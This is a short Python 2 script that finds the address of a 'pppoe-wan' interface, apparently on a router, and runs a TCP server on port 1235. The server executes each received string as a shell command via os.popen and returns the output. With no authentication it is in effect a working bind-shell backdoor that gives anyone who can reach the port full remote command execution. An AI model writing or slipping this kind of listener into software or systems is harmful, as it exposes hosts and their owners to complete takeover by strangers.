# coding=utf-8
import socket
import os
import fcntl
import struct

lan_ip = ''
port = 1235

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])


def create_srv():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((lan_ip, port))
    sock.listen(1)
    print 'start'
    while 1:
        conn, addr = sock.accept()
        while 1:
            print'Connected by', addr
            data = conn.recv(1024)
            if len(data) >1200:
                break
            if len(data) == 0:
                print 'done' 
                break          
            else:
            	resend=os.popen(data).read().rstrip();
            	if len(resend)==0:
            		conn.send('NULL')
            	else:
                	conn.send(resend)
    conn.close()


def main():
    lan_ip=get_ip_address('pppoe-wan')
    print lan_ip
    create_srv()

if __name__ == '__main__':
    main()